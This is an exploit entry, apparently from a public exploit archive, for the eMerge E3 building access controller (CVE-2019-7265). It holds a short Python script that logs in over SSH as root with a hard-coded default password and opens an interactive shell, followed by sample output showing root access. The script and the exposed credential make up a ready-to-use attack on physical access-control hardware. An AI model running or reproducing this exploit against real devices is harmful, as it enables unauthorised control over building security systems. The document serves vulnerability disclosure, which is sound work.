# Exploit Title: eMerge E3 Access Controller 4.6.07 - Remote Code Execution
# Google Dork: NA
# Date: 2018-11-11
# Exploit Author: LiquidWorm
# Vendor Homepage: http://linear-solutions.com/nsc_family/e3-series/
# Software Link: http://linear-solutions.com/nsc_family/e3-series/
# Version: 4.6.07
# Tested on: NA
# CVE : CVE-2019-7265
# Advisory: https://applied-risk.com/resources/ar-2019-009
# Paper: https://applied-risk.com/resources/i-own-your-building-management-system
# Advisory: https://applied-risk.com/resources/ar-2019-005

#!/usr/bin/env python
#
# ====
# python lineare3_sshroot.py 192.168.1.2
# [+] Connecting to 192.168.1.2 on port 22: Done
# [!] Only Linux is supported for ASLR checks.
# [*] root@192.168.1.2:
#     Distro    Unknown Unknown
#     OS:       Unknown
#     Arch:     Unknown
#     Version:  0.0.0
#     ASLR:     Disabled
#     Note:     Susceptible to ASLR ulimit trick (CVE-2016-3672)
# [+] Opening new channel: 'shell': Done
# [*] Switching to interactive mode
# Last login: Fri Nov  1 04:21:44 2019 from 192.168.2.17
# root@imx6slevk:~# id
# uid=0(root) gid=0(root) groups=0(root)
# root@imx6slevk:~# pwd
# /home/root
# root@imx6slevk:~# exit
# logout
# [*] Got EOF while reading in interactive
# [*] Closed SSH channel with 192.168.1.2
# ====

from pwn import *

if len(sys.argv) < 2:
    print 'Usage: ./e3.py <ip>\n'
    sys.exit()

ip = sys.argv[1]
rshell = ssh('root', ip, password='davestyle', port=22)
rshell.interactive()